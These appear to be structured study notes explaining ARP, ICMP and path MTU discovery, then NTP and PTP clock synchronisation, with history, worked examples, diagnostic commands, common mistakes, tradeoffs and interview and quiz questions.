@@ arpicmp
value: IP addresses name hosts across the whole internet, but a frame on an Ethernet cable or Wi-Fi link is delivered by hardware addresses (MAC addresses, 48 bits). Before a host can send an IP packet to a neighbour, it must learn which MAC address belongs to that neighbour's IP address. ARP (Address Resolution Protocol) solves this with one broadcast question: "who has 10.0.0.7? tell 10.0.0.5". The owner answers directly, and the asker keeps the answer in a small table, the neighbour (ARP) cache, for a few seconds to minutes.
IP itself is a best-effort service: a router that cannot deliver a packet just drops it, and the sender would never know why. ICMP (Internet Control Message Protocol) is the side channel that fixes this. It carries error reports ("destination unreachable", "time exceeded", "packet too big") and simple probes (echo request and echo reply, which is what `ping` uses). `traceroute` works only because routers send ICMP "time exceeded" when a packet's hop limit reaches zero.
MTU (maximum transmission unit) is the largest packet a link can carry; classic Ethernet is 1500 bytes. A path crosses many links with different MTUs, and a sender must not send packets larger than the smallest one. Path MTU discovery uses ICMP to learn that size. So these three small mechanisms sit between the link layer below (Ethernet, which delivers frames by MAC address) and the routing layer (IP, which picks the next hop by address), and they make the pair work in practice. When they break, the symptoms are strange and costly: a connection that opens but hangs on the first large response, or an address that "flaps" between two machines.
terms: MAC address — a 48-bit hardware address of a network interface, such as 3c:22:fb:aa:01:7e; Ethernet delivers frames by it.
Broadcast — a frame sent to the all-ones MAC address ff:ff:ff:ff:ff:ff; every host on the link receives it.
Neighbour cache — the table that maps IPs on the local link to MAC addresses, filled by ARP (IPv4) or NDP (IPv6) and expired over time.
Gratuitous ARP — an ARP message a host sends about its own address, without being asked, to update other hosts' caches.
ICMP — a control protocol carried inside IP packets (IP protocol number 1); it reports errors and answers probes.
TTL (hop limit) — a counter in the IP header that each router decrements; at zero the router drops the packet and sends an ICMP "time exceeded".
MTU — the largest IP packet, in bytes, that a link can carry without splitting it; 1500 on standard Ethernet.
MSS — the largest TCP payload in one segment; it equals the MTU minus the IP and TCP headers (1500 − 20 − 20 = 1460).
Path MTU — the smallest MTU on all links between sender and receiver.
DF bit — the "Don't Fragment" flag in the IPv4 header; a router that cannot forward such a packet drops it and reports it with ICMP.
history: ICMP is older than ARP. Jon Postel wrote RFC 792 in September 1981 as part of the first complete IP specification. It defined echo, destination unreachable, time exceeded, redirect and a few other messages. ARP came with Ethernet. David Plummer wrote RFC 826 in November 1982, "An Ethernet Address Resolution Protocol", because MIT researchers wanted to run IP over 10 Mbit/s Ethernet and needed a way to map 32-bit IP addresses to 48-bit Ethernet addresses without a central table. The RFC is only a few pages long, and the packet format it defined is still in use.
Two tools made ICMP famous. Mike Muuss wrote `ping` in 1983 (he said later that he named it after the sound of sonar). Van Jacobson wrote `traceroute` in 1987–1988; it sends packets with TTL 1, 2, 3 and so on, and reads the "time exceeded" replies to list every router on the path.
Fragmentation was the original answer to MTU differences: a router split a big packet into pieces and the receiver reassembled them. This turned out to be slow and fragile; Kent and Mogul's 1987 paper "Fragmentation Considered Harmful" explained why. RFC 1191 (Mogul and Deering, 1990) introduced path MTU discovery: set the DF bit and let ICMP tell you the right size. IPv6 (RFC 2460 in 1998, then RFC 8200) went further and forbade routers from fragmenting at all. The weakness of this design appeared later: many firewall administrators blocked all ICMP "for security", which silently broke path MTU discovery. RFC 4821 (2007) added packetization-layer discovery, which probes with real data and does not need ICMP; RFC 8899 (2020) extended it to UDP and QUIC.
how: Start with how a host sends one IP packet. The IP layer (the routing concept that this read stands on) looks at the destination address and the host's routing table. If the destination is in the same subnet, the next hop is the destination itself. If not, the next hop is the default gateway. Either way, the packet must now be put into an Ethernet frame, and Ethernet (the link concept) needs a destination MAC address. That is the job of ARP.
Step 1: the host looks up the next-hop IP in its neighbour cache. On a hit, it builds the frame and sends it. On a miss, the packet waits in a small queue (Linux holds only a few packets per unresolved neighbour) while the host sends an ARP request.
Step 2: the ARP request is a 28-byte message inside an Ethernet frame with EtherType 0x0806. Its fields are the hardware type (1 for Ethernet), the protocol type (0x0800 for IPv4), the address lengths (6 and 4), the opcode (1 for request), and four addresses: the sender's MAC and IP, and the target's MAC (all zeros, because it is unknown) and IP. The frame's destination MAC is ff:ff:ff:ff:ff:ff, so a switch (the Ethernet concept) floods it out of every port in the same VLAN, and every host on the segment receives it.
Step 3: every host reads the request. Only the host that owns the target IP replies. It sends a unicast ARP reply (opcode 2) straight to the asker's MAC, saying "this IP is at my MAC". The other hosts ignore the question. A useful detail: while handling the request, the owner also learns the asker's IP-to-MAC pair from the request itself, so the return traffic needs no second ARP exchange.
Step 4: the asker stores the pair in its cache, sends the queued packets, and starts a timer. In Linux the neighbour entry moves through states: INCOMPLETE (request sent, no answer), REACHABLE (recently confirmed, by default for about 30 seconds, randomised), STALE (not confirmed recently, but still used), DELAY and PROBE (the kernel waits briefly for evidence such as TCP traffic that proves the neighbour is alive, then sends a unicast ARP probe), and FAILED. You can see them with `ip neigh`. If no answer comes after a few retries, the packets are dropped and the application sees "host unreachable".
Now ICMP. An ICMP message is an IP packet with protocol number 1. It has a type, a code, a checksum, and a body. The important types are 8 and 0 (echo request and reply), 3 (destination unreachable, with codes for network, host, port and "fragmentation needed"), 11 (time exceeded) and 5 (redirect). Error messages include the IP header and the first 8 bytes of the packet that caused the error (modern routers often include more), so the original sender can match the error to a connection: the first 8 bytes of a TCP or UDP header hold the port numbers. Two rules prevent loops: no ICMP error is sent about an ICMP error, and routers rate-limit ICMP generation (Linux defaults to about one message per second per destination for most error types).
Traceroute uses this directly. It sends a probe with TTL 1; the first router decrements it to 0, drops the packet and returns "time exceeded" from its own address. Then TTL 2 reaches the second router, and so on. When a probe finally reaches the destination, a UDP probe to an unused port gets "port unreachable" (type 3, code 3), and an ICMP probe gets an echo reply, which ends the trace.
Path MTU discovery is the third piece. TCP sets the DF bit on its packets. If a router must forward a 1500-byte packet onto a link with MTU 1400, it cannot fragment (DF is set), so it drops the packet and sends ICMP type 3, code 4 ("fragmentation needed and DF set") with the next-hop MTU, 1400, in the message. The sender lowers its cached path MTU for that destination and resends in smaller segments. In IPv6 there is no DF bit because routers never fragment; the message is "Packet Too Big" (ICMPv6 type 2). The cached value expires after about 10 minutes, so the sender tries a larger size again.
Tunnels and overlays shrink the usable MTU, and this is where the problem appears most often today. A VXLAN overlay adds about 50 bytes of headers, WireGuard adds 60 to 80 bytes, and IPsec and GRE add their own. If the inner network still uses 1500, packets no longer fit. The practical fixes are to set a smaller MTU on the inner interface, to allow ICMP so path MTU discovery works, or to clamp the TCP MSS during the handshake so that endpoints never produce oversize segments.

example: First, a TCP hang caused by a blocked ICMP. A service in a data centre (MTU 1500) talks to a partner over a VPN tunnel that adds 80 bytes of headers, so the tunnel can carry at most 1420 bytes of inner packet. The TCP handshake works: SYN, SYN-ACK and ACK are tiny. Each side announces an MSS of 1460, which assumes an MTU of 1500. The client sends a small request and it works. The server replies with a 1460-byte segment, which is a 1500-byte packet with DF set. The tunnel router must drop it and send ICMP "fragmentation needed, MTU 1420". A firewall in front of the server drops all ICMP. The server never learns the new size and retransmits the same large segment again and again. From the user's view: the connection opens, small responses work, and large ones hang. This is called a path MTU black hole.
You can see it with a probe. The test packet size is the payload plus 8 bytes of ICMP header plus 20 bytes of IP header:
```bash
# 1472 + 8 + 20 = 1500 bytes on the wire at IP level, DF set
ping -M do -s 1472 partner.example.com
# works only if every link carries 1500; try smaller values
ping -M do -s 1392 partner.example.com   # 1392+28 = 1420
```
If 1472 fails with "message too long" or silence but 1392 works, the path MTU is between those values. A binary search over the size finds it exactly: here it would settle at 1392, so the path MTU is 1420.
Fixes, from best to most blunt: allow ICMP type 3 code 4 (and ICMPv6 type 2) through every firewall; set the tunnel interface MTU to 1420 so the local stack already uses 1420 as its limit; or clamp the MSS on the tunnel router (on Linux, `iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu`), which rewrites the MSS in each SYN to 1380 (1420 − 40). On Linux you can also set `net.ipv4.tcp_mtu_probing=1`, which makes TCP probe for a working size when it sees repeated retransmissions.
intuition: ARP is shouting a name in a room and listening for who turns around; ICMP is the postal service sending back a note that says why your parcel could not be delivered.
The design is natural because it follows the split of jobs. IP addresses are chosen by people and the network plan, and they are routable. MAC addresses are fixed by hardware makers and only mean something on one link. Something must connect them, and the cheapest way without a central server is to ask the whole link and let the owner answer. Every host keeps the answer for a short time, so the broadcast cost is paid rarely.
ICMP follows the "dumb network, smart edges" idea. Routers do not keep state about connections, so when they drop a packet they can only tell the original sender, using the packet's own header as the address. The sender's stack then acts on the report. Path MTU discovery is a clean example: the network does not negotiate a size; it simply drops what does not fit and says how big the limit is, and the endpoints adapt.
mistakes: People often think ARP works across routers. In fact ARP is strictly local to one broadcast domain, because routers do not forward broadcasts. A host never ARPs for a remote server; it ARPs for its default gateway, and the gateway ARPs on the next link.
People often think blocking ICMP makes a network more secure and costs nothing. In fact blocking the "fragmentation needed" and "packet too big" messages breaks path MTU discovery and causes connections that hang on large transfers. Block or rate-limit the risky types (such as redirects and echo from the internet if you wish), but allow the error types that TCP needs.
People often think ping success proves a service is healthy. In fact an echo reply shows only that the host's IP stack answered. The application port may be closed or overloaded, a firewall may treat ICMP differently from TCP, and many hosts and cloud load balancers do not answer ping at all. A failed ping also does not prove the host is down.
People often think a larger MTU is always better. In fact jumbo frames (about 9000 bytes) reduce per-packet overhead inside a data centre, but every device on the path must support them. One link at 1500 in the middle turns each big packet into a drop or a fragment. Cloud networks show this: a VPC may allow 9001 bytes between instances, but traffic that leaves toward the internet is limited to 1500.
friction: ARP has no security. Any host on a link can claim any IP address, and the standard has no way to verify it. ARP spoofing allows man-in-the-middle attacks on flat networks, and the defences (dynamic ARP inspection on switches, 802.1X, private VLANs, static entries) need configuration on every switch. Large layer-2 networks also suffer from ARP broadcast load, and data centres moved to routed designs or to overlays with ARP suppression for this reason: in EVPN-VXLAN fabrics, the leaf switch answers ARP requests from its own table instead of flooding them.
ARP caches create operational problems during failover. When a virtual IP moves from one machine to another (a floating IP, VRRP, a Kubernetes service address announced by a load balancer such as MetalLB in layer-2 mode), other hosts keep the old MAC until their entries expire. The new owner sends gratuitous ARP to update them, but some devices ignore unsolicited replies, so failover can take tens of seconds. In clouds, the virtual network usually answers ARP itself and ignores what your instances say.
ICMP has its own limits. Routers generate it on a slow path in the control plane, so it is rate-limited and measured values of latency in a traceroute can be misleading: a router may be slow to answer a probe while forwarding real traffic fast. Error messages carry only a small part of the original packet, which makes them easy to forge; an attacker who guesses the addresses and ports of a connection can send a fake "fragmentation needed" with a tiny MTU to force the victim to use small packets, or a fake "port unreachable" to reset a flow. Operating systems therefore enforce a minimum path MTU (552 bytes on Linux by default) and validate that the quoted header matches a real connection.
practice: Learn four commands. `ip neigh` shows the neighbour cache with states; many entries in FAILED or INCOMPLETE mean ARP is not being answered (wrong VLAN, a down host or a filtering switch). `arping -I eth0 10.0.0.7` sends real ARP requests, which tests layer 2 even when a firewall blocks ping. `ping -M do -s N` with the DF bit finds the path MTU as in the example above. `traceroute -n` (or `mtr`, which repeats the trace and shows loss per hop) shows where a path breaks; read it as a sample, not as the truth.
Set MTUs on purpose. For every overlay or tunnel, subtract its header size from the underlay MTU and set the inner interface to that value. In Kubernetes, the CNI plugin (Calico, Cilium, Flannel) must be set with an MTU that accounts for VXLAN or WireGuard overhead; wrong values are a common source of "works for small requests, hangs for large ones". Use jumbo frames only when you control every device on the path, such as a storage or Spark shuffle network, and test the end-to-end size with the DF ping.
Firewall policy: allow ICMP type 3 (all codes), type 11, and for IPv6 also the neighbour discovery and Packet Too Big messages, because IPv6 breaks without them. Rate-limit echo requests if you want, but do not drop errors. On the Linux side, enable `net.ipv4.tcp_mtu_probing=1` in environments where you cannot control the path, and consider MSS clamping on gateways that terminate tunnels.
tradeoffs: Fragmentation versus path MTU discovery. Let routers fragment (IPv4 without DF) when you cannot control or trust ICMP on the path, for example with some UDP applications; accept the cost, because a lost fragment forces the whole packet to be resent and fragments are often dropped by firewalls. Use DF with path MTU discovery for TCP when ICMP works, because it keeps packets whole and the sender learns the right size once.
Standard 1500 versus jumbo frames. Choose jumbo frames (about 9000 bytes) for bulk traffic inside a network you fully control, such as storage, backups or Spark shuffles, where fewer packets can reduce CPU use by a noticeable share and raise throughput on 25 to 100 Gbit/s links. Choose 1500 when any part of the path is outside your control (the internet, partner links, some VPNs), because one mismatched device causes drops that are hard to find. Either way you must test the full path.
Large flat layer-2 network versus routed subnets. Choose a flat network when simplicity and live migration of virtual machines with the same IP matter and the host count is small (hundreds). Choose routed subnets (a layer-3 network down to the rack, as in leaf-and-spine designs) when you have thousands of hosts, because ARP broadcasts, spanning-tree failures and MAC table limits grow with the size of the domain. You give up easy IP mobility and must use overlays or routing protocols to get it back.
MSS clamping versus fixing the path. Clamp the MSS at the tunnel edge when you cannot make ICMP work end to end; it is cheap and solves TCP at once. It does nothing for UDP, and it hides the real problem. Choose to fix the MTU and ICMP policy when you can, because that helps every protocol.
interview: A TCP connection to a service opens, small requests work, but large responses hang. How do you diagnose it? || Suspect a path MTU black hole. Test with `ping -M do -s` to find the largest packet that passes, and capture traffic to see repeated retransmissions of full-size segments with no ICMP "fragmentation needed" arriving. Look for a firewall dropping ICMP type 3 code 4, or for a tunnel with a smaller MTU. Fix by allowing ICMP, setting the correct MTU on the tunnel interface, or clamping the MSS.
Walk me through exactly what happens, at link and IP level, when host A sends its first packet to a server in another subnet. || A checks its routing table and picks the default gateway as next hop. It looks for the gateway's MAC in the neighbour cache; on a miss it broadcasts an ARP request for the gateway's IP and gets a unicast reply. It sends the frame with the gateway's MAC but the server's IP. The gateway removes the frame, decrements the TTL, looks up the route, and repeats ARP on the next link. The MAC address changes at every hop; the IP addresses stay the same.
Why can a traceroute show a slow hop in the middle but fast hops after it? || Router replies to probes are produced by the control-plane CPU on a slow path and are often rate-limited or low-priority, while forwarded traffic is handled by hardware. A slow reply from one hop is not a slow forwarding path if later hops answer quickly. Only latency or loss that continues to the end is real.
How does a floating virtual IP move to a new machine, and what can go wrong? || The new owner brings up the address and sends gratuitous ARP so that neighbours replace the old MAC in their caches. Problems: devices that ignore unsolicited ARP keep the old mapping until the entry expires, the old owner may still answer (split brain), and a switch's MAC table may need time to learn the new port. Mitigate with several gratuitous ARPs, short cache timers and fencing of the old node.
quiz: What does an ARP request contain, and where is it sent? || The sender's MAC and IP and the target IP (target MAC left as zeros), inside an Ethernet frame sent to the broadcast address ff:ff:ff:ff:ff:ff. Only the host that owns the target IP answers, with a unicast reply.
Why do routers use ICMP "time exceeded" and how does traceroute use it? || The TTL field stops packets from looping forever; the router that decrements it to zero drops the packet and reports it. Traceroute sends probes with TTL 1, 2, 3 and so on, so each router in turn reveals its address by sending the error.
Why does a firewall that blocks all ICMP cause large transfers to hang while small ones work? || Large packets with DF set exceed the MTU of some link, and the router tells the sender the correct size using ICMP type 3 code 4. If the message is blocked, the sender keeps resending packets that can never pass. Small packets fit and are not affected.
A VXLAN overlay adds 50 bytes of headers over an underlay with MTU 1500. What inner MTU and TCP MSS should you configure? || Inner MTU 1500 − 50 = 1450. The TCP MSS is 1450 − 20 (IP) − 20 (TCP) = 1410 bytes.
When would you clamp the MSS instead of relying on path MTU discovery? || When ICMP cannot be trusted to arrive, for example across a VPN or a customer firewall you do not control. Clamping fixes TCP at once, but not UDP, and it leaves the underlying MTU problem in place.

@@ ntp
value: Every computer keeps time with a quartz crystal that counts oscillations. Crystals are cheap, but they are not exact: a typical one runs fast or slow by 10 to 100 parts per million (ppm), and the rate changes with temperature. At 50 ppm a clock gains or loses about 4.3 seconds per day. Without correction, two servers that started together disagree by seconds within a day, and by minutes within weeks.
Clock synchronization fixes this. NTP (Network Time Protocol) lets a machine ask other machines for the time, measure how far off it is, and correct its clock gradually, over the ordinary internet, to within a few milliseconds (tens to hundreds of microseconds on a good local network). PTP (Precision Time Protocol, IEEE 1588) goes further: network cards and switches stamp packets in hardware at the moment they cross the wire, which removes software jitter and reaches well below a microsecond.
The layers above need this more than they admit. Log lines from many machines can only be merged in order if clocks agree. Certificate and token expiry, Kerberos (which rejects tickets with more than 5 minutes of skew), and cache TTLs depend on it. Leases and leader election assume bounded clock drift. Time-ordered IDs assume the clock does not jump back. Spanner's TrueTime is, in effect, NTP's idea made rigorous: it exposes the clock's uncertainty as an interval. Underneath, NTP stands on hardware clocks and quartz crystals (what drifts), on atomic clocks and GPS (where true time comes from), on the speed of light (why network delay limits accuracy), on statistics (how to pick a good estimate from noisy samples) and on sockets (NTP is a UDP protocol on port 123).
terms: Offset — how far a clock is from the reference time (positive means the local clock is behind).
Delay (round-trip delay) — the time a request and its reply spend on the network, not counting the server's processing time.
Drift — the slow change of a clock's rate, in ppm; 1 ppm is 1 microsecond of error per second.
Stratum — the distance from a reference clock: stratum 0 is the atomic or GPS clock itself, stratum 1 a server attached to it, stratum 2 a server that syncs from stratum 1, and so on up to 15.
Step and slew — to step is to set the clock to a new value at once; to slew is to run it slightly faster or slower until the error is gone.
Disciplining — continuously steering a local oscillator so that it follows a reference, using a feedback loop.
Hardware timestamping — recording a packet's send or receive time inside the network card, not in the operating system.
Leap second — a second inserted into UTC (27 times since 1972, the last on 31 December 2016) to keep it close to the Earth's rotation.
Clock smearing — spreading a leap second over many hours as a tiny rate change, so that no clock ever shows 23:59:60.
history: David Mills, at the University of Delaware, built the first time-synchronisation systems for the early internet. His "Fuzzball" routers on the NSFNET backbone in the 1980s synchronised themselves, and the protocol was written down in RFC 958 (1985) and then refined as NTP versions 1 to 3 (RFC 1059 in 1988, RFC 1119 in 1989, RFC 1305 in 1992). It is one of the oldest internet protocols still in daily use. Version 4 (RFC 5905) appeared in 2010.
The reference implementation `ntpd` ran most servers for decades. Newer designs replaced it on many systems: `chrony` (Richard Curnow, 1990s onward, now the default on Red Hat and many cloud images) handles intermittent networks, virtual machines and fast convergence better. NTP had a bad period in 2013 and 2014 when servers with the `monlist` command were used for DDoS amplification (a small request produced a very large reply). Authentication was weak for a long time; Network Time Security (RFC 8915, 2020) added TLS-based keys.
PTP came from industrial automation and measurement. IEEE 1588 was published in 2002, with version 2 in 2008. Telecommunications (5G radio needs phase alignment within about 1.5 microseconds), financial trading (the EU MiFID II rules require high-frequency trading clocks to stay within 100 microseconds of UTC) and data centres adopted it. Large cloud operators now offer hardware-assisted time: Google built TrueTime from GPS receivers and atomic clocks in every data centre (2012), and public clouds provide NTP services from within the provider network (for example Amazon Time Sync at 169.254.169.123) and, on some instance types, a PTP hardware clock.
Time itself is also changing. The Earth's rotation is irregular, so leap seconds were added; they caused outages (for example the 2012 Linux and Java hangs). In 2022 the international standards body (CGPM) decided to stop using leap seconds by 2035. NTP's own 32-bit seconds counter, which counts from 1900, overflows on 7 February 2036, which is handled by the "era" field in NTPv4.
how: The core is a four-timestamp exchange over UDP (the sockets concept). The client records T1 and sends a request. The server records T2 when it arrives and T3 when it replies. The client records T4 when the reply arrives. T1 and T4 come from the client's clock, T2 and T3 from the server's. Two quantities follow:
\[ \theta = \frac{(T_2 - T_1) + (T_3 - T_4)}{2}, \qquad \delta = (T_4 - T_1) - (T_3 - T_2) \]
Here θ is the estimated offset of the client from the server and δ is the round-trip delay with the server's processing time removed. The formula for θ assumes the forward and return network delays are equal. If they are not, the error in θ is half the difference, and it can never be larger than δ/2. This bound is why NTP trusts samples with small delay: a fast round trip leaves little room for asymmetry. Here the speed of light enters: light in fibre covers about 200 km per millisecond, so a path of 2,000 km has at least 20 ms of round trip, and no software can remove that.
A single sample is noisy, because queues in routers add random delay. `ntpd` and `chrony` therefore keep the last eight or so samples per server and prefer the one with the lowest delay, since that sample was least disturbed. This is plain statistics (the L4 estimation concept): when noise only adds delay, the minimum is the best estimate.
Next, the client usually talks to several servers. It must decide which are right (truechimers) and which are wrong (falsetickers). NTP uses an intersection algorithm, derived from Marzullo's work: each server gives an interval, offset ± half the delay (plus its own error bound), and the algorithm finds the largest region where most intervals overlap. Servers whose intervals are outside it are dropped. This is why you configure at least three, and preferably four or more, servers: with two, a disagreement cannot be resolved; with three, one liar can be outvoted. The survivors are ranked by stratum and jitter, and combined with weights.
The result goes to the clock discipline loop. This is a feedback controller, a hybrid of a phase-locked loop and a frequency-locked loop. It takes the offset estimate and adjusts two things in the kernel: a small phase correction and the frequency (rate) of the software clock. The kernel interface is `adjtimex` / `ntp_adjtime` on Linux. Because the clock must not jump backward (programs measure durations with it, and time-ordered IDs depend on it), small errors are slewed: the clock runs at most 500 ppm faster or slower, so a 100 ms error takes 200 seconds to remove. Larger errors are stepped: `ntpd` steps when the offset is over 128 ms, and `chrony` can be told to step in the first few updates after boot (`makestep`). The loop also learns the oscillator's drift and stores it in a file (the "drift file"), so after a restart it starts with the right frequency. This is the crystal concept at work: because quartz drift is slow and smooth (mostly a function of temperature), it can be predicted and cancelled between updates.
The polling interval adapts. Right after start, `ntpd` polls every 64 seconds; when the clock is stable, the interval grows by powers of two up to 1,024 seconds (the common maximum, though it can go further). Each poll is one small packet, 48 bytes of UDP payload, so a server can serve very many clients.
Where does true time come from? At the top is stratum 0: GPS receivers (which deliver UTC to within tens of nanoseconds by comparing signals from satellites carrying atomic clocks), caesium or rubidium clocks, and national laboratories. Stratum 1 servers are attached to these. Everyone else is a few strata away. Public pools such as pool.ntp.org spread load over thousands of volunteer servers.
PTP changes where the timestamps are taken. In NTP, T1 and T4 are read by the operating system, after interrupts, scheduling and the network stack have added tens of microseconds of random delay. PTP timestamps the packet in the network card's hardware, as the first bit leaves or arrives. Switches that act as boundary clocks or transparent clocks measure and correct for the time each packet spends inside them. A Best Master Clock algorithm chooses the grandmaster, normally a GPS-disciplined clock. On Linux, `ptp4l` runs the protocol and `phc2sys` copies the card's clock to the system clock. Results are tens to hundreds of nanoseconds on a well built network.
diagram:
  Four timestamps, one exchange (time runs downward)

   client clock                              server clock
   ------------                              ------------
   T1 ----- request  (forward delay d1) ------> T2
                                                |  server processing
   T4 <---- reply    (return delay d2)  ------- T3

   offset = ((T2-T1) + (T3-T4)) / 2     exact only if d1 == d2
   delay  = (T4-T1) - (T3-T2)           error in offset <= delay / 2

example: Work one exchange with a pen. The client clock is 100 ms behind the server. The forward network delay is 10 ms, the return delay is 30 ms (asymmetric on purpose), and the server takes 1 ms to answer. Use seconds.
The client sends at T1 = 1000.000 (client clock). In server time that moment is 1000.100. The packet arrives 10 ms later, at server time 1000.110, so T2 = 1000.110. The server replies at T3 = 1000.111. The reply takes 30 ms, so it arrives at server time 1000.141. The client clock is 100 ms behind, so it reads T4 = 1000.041.
Delay: (T4 − T1) − (T3 − T2) = 0.041 − 0.001 = 0.040 s, which is 10 + 30, as expected. Offset: ((1000.110 − 1000.000) + (1000.111 − 1000.041)) / 2 = (0.110 + 0.070) / 2 = 0.090 s. The true offset is 0.100 s. The error is 10 ms, which equals half the asymmetry ((30 − 10) / 2), and it is inside the bound δ/2 = 20 ms. Nothing in the four numbers reveals the asymmetry; this is the limit of the method.
Now what the client does. It has an offset of 90 ms, below the 128 ms step limit, so it slews. At the maximum slew rate of 500 ppm (0.5 ms per second) it takes 90 / 0.5 = 180 seconds. Meanwhile the oscillator itself runs 50 ppm fast, which is 50 microseconds more per second, or 4.3 seconds per day. The discipline loop notices after a few polls that the offset keeps growing by about 50 µs each second, sets the clock frequency 50 ppm lower, and writes this to the drift file. After that, the polls show only small residual errors.
With four servers, the client may see offsets of +89 ms, +91 ms, +90 ms and −2.3 s (a server with a wrong clock). The intersection of the intervals ignores the last one. If only two servers had been configured, the client could not tell which of +90 ms and −2.3 s is right.
intuition: Synchronising clocks is like several people setting their watches by phoning a friend who has the right time: you cannot know how long the voice took to arrive, but you can ask many times and trust the quickest answers.
The design is natural once you accept two facts. You cannot measure one-way delay without already having a shared clock, so you measure the round trip, which needs only one clock, and assume the two directions are equal. The unknown part is bounded by half the round trip, so you look for the fastest exchanges. And because a good crystal is stable over minutes, you do not need to fix the clock constantly: you measure slowly, learn the rate error, and let the oscillator run on its own between updates.
mistakes: People often think NTP makes all clocks exactly equal. In fact it keeps them within a bound, typically a few milliseconds over the internet, and the bound is not guaranteed. During a network outage or a bad server, a clock can drift away unnoticed. Systems that need correctness must treat clock error as an interval, not a point.
People often think the system clock never goes backward if NTP is running. In fact a step correction after a long outage, a virtual machine pause, a leap second, or an administrator running `date` can move wall-clock time back. Use the monotonic clock (`CLOCK_MONOTONIC`, Java `System.nanoTime`) for measuring durations and timeouts, and wall-clock time only for timestamps.
People often think more precision from PTP means NTP is obsolete. In fact PTP needs hardware and network support all along the path (cards and switches), and it is built for local networks. NTP works everywhere, needs no special hardware, and is accurate enough for logs, certificates and most services.
People often think a stratum number measures accuracy. In fact stratum only counts hops from a reference. A stratum 2 server on a quiet local network can be more accurate than a stratum 1 server across a congested link, which is why NTP weighs delay and jitter, not just stratum.
friction: Network asymmetry is the main accuracy limit, and it cannot be detected with NTP alone. Cable modems, mobile links, Wi-Fi and satellite paths can differ by tens of milliseconds between upload and download. Virtual machines add more error: the guest clock is driven by the hypervisor, and a pause or live migration can shift it by seconds, so cloud guests normally read time from the host (the PTP hardware clock, or a paravirtual clock) and not from the internet.
Failures are quiet. If NTP stops working, nothing alerts you; the clock just drifts. A bad GPS antenna, a spoofed GPS signal, a faulty server returning wrong time, or a firewall that blocks UDP 123 can all produce skew. Wrong time then shows up as a failing TLS handshake, a rejected Kerberos ticket, missing logs from a time window, or a distributed lock that two nodes think they hold. NTP packets were unauthenticated for a long time, so an attacker on the path could shift your time; NTS (RFC 8915) fixes this but is not yet universal.
Leap seconds are still hard. Different providers handle them differently: some step the clock back one second, some repeat 23:59:59, and some (Google, and several clouds) smear it over 24 hours. Mixing these in one cluster means servers disagree by up to 0.5 seconds for a day. Also, the 2036 rollover and the end of leap seconds will need careful testing.
Finally, there is a gap between being synchronised and being safe. Even with good NTP, two machines can disagree by several milliseconds, and no protocol can give a hard guarantee over an unreliable network. Systems that need ordering across machines either use logical clocks (hybrid logical clocks), or expose uncertainty and wait it out (Spanner's commit wait).
practice: Run `chrony` (or `systemd-timesyncd` for simple clients) on every host and configure four servers or more. In the cloud, use the provider's internal time source instead of the public pool; it has lower delay and no internet dependency. Check health with `chronyc tracking` (current offset, frequency error, and "root dispersion", the worst-case error estimate) and `chronyc sources -v`. Alert when the offset is above your tolerance, not only when the daemon is down. Export these as metrics.
Pick one leap-second policy for the whole fleet, ideally smearing, and make sure every source uses the same one. Do not mix smearing and non-smearing servers in one chrony or ntpd configuration.
In code, use the monotonic clock for timeouts, retry delays, rate limits and benchmarks; use the wall clock for timestamps that humans or other machines will read. When correctness depends on time (a lease, a lock expiry, token validity), add a safety margin larger than your worst expected clock error, or use fencing tokens, which do not depend on clocks at all. Do not use wall-clock timestamps to decide "which write came last" across machines unless you accept lost updates.
Use PTP when you need microsecond-level agreement: trading, telecom, sensor networks, and some databases that rely on tight bounds. It requires NICs with hardware timestamping (check `ethtool -T eth0`), switches that support PTP, and a good grandmaster. Test the whole path; one unaware switch in the middle breaks the accuracy.
tradeoffs: NTP versus PTP. Choose NTP when a millisecond or a few of error is acceptable, you run on cloud virtual machines, or the path crosses networks you do not control. Choose PTP when you need microseconds or less and you control the network hardware. You give up simplicity: PTP needs special NICs, switches and a local grandmaster clock, and costs more to operate.
Public pool versus your own servers. Choose the public pool for small deployments where tens of milliseconds are fine. Choose your own stratum 1 (GPS receivers) or a cloud provider's internal service when you have hundreds of machines, need predictable delay, or cannot allow outbound UDP 123. You take on the work of keeping the sources healthy and secured.
Step versus slew. Slew when running software depends on a monotonic, continuous clock (almost always); it is slow, and can take minutes or hours for large errors. Step at boot, before services start, so the first correction is instant. Stepping a running database or lease holder can cause an incident.
Leap smear versus leap step. Choose a smear when many systems must stay consistent, and you control all clocks; it gives up legal accuracy of up to 0.5 seconds for a day. Choose a step when you must match UTC exactly (some regulated trading and telecom systems), and accept that software must tolerate a repeated or missing second.
Trust the clock versus avoid it. Use physical time when order does not need to be exact, such as logs and expiry. Choose logical or hybrid clocks, or consensus, when "A happened before B" must be correct; they cost extra metadata and messages, but they do not break when a clock jumps.
interview: Why does NTP use a round trip instead of asking the server for its time and subtracting the network delay? || One-way delay cannot be measured without synchronised clocks, which is the thing being established. A round trip uses only the client's clock, and NTP assumes symmetry, so the offset error is at most half the round-trip delay. That is also why it prefers samples with the lowest delay.
A distributed lock service uses leases with a 10 second timeout. What can go wrong with clocks, and how do you make it safe? || A holder with a slow clock believes its lease is still valid after the server expired it, so two holders write at once. Also a process pause (GC, VM migration) has the same effect. Use bounded clock error with a safety margin, monotonic clocks for measuring elapsed time, and fencing tokens so the storage rejects stale holders.
Your Kerberos logins and TLS handshakes suddenly fail on some hosts. What do you check? || Clock skew first: `chronyc tracking` and `date` against a good source. Look for a stopped daemon, blocked UDP 123, a VM that was paused or restored from a snapshot, or a bad time source. Fix the sync, step the clock before restarting services, and add an offset alert.
How does Spanner's TrueTime differ from using NTP timestamps? || TrueTime returns an interval [earliest, latest] that is guaranteed to contain true time, with the width (1 to 7 ms) derived from GPS and atomic clock references and polling error. A transaction waits out the uncertainty (commit wait) before it becomes visible, which gives external consistency. NTP gives a point estimate with a probable, not guaranteed, error.
How would you design time for 5,000 servers in two data centres? || Use GPS-disciplined stratum 1 servers in each data centre (or the cloud's internal time), with 4+ sources per client, chrony everywhere, a single leap policy, and monitoring of offset and root dispersion per host. Use PTP only on the subset that needs microseconds. Put alerts on offset and on sources disagreeing.
Why can a VM's clock jump after a live migration, and how do you handle it? || The guest keeps counting with its virtual oscillator while it is paused, and the host's clock source may differ on the new machine. After resume the guest clock is behind by the pause length. Handle it with a paravirtual clock or the PTP hardware clock, and by triggering an immediate step or fast resync (chrony reacts to the resume event).
